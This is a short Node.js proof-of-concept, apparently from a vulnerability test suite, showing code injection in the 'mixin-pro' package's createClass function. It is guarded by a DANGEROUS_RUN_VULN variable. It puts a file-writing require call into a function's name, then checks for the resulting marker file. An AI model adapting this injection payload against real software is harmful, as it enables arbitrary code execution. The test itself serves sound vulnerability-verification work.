if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const Class = require("mixin-pro").createClass;
const path = "./mixin-pro";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	function Foo() {}
	Object.defineProperty(Foo, "name", {
		enumerable: false,
		configurable: false,
		writable: true,
		value: "static",
	});
	Foo.name =
		"test2()\n{}; require(`fs`).writeFileSync('mixin-pro', ''); function __ctor";
	let Bar1 = Class(Foo, { constructor: Foo });
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
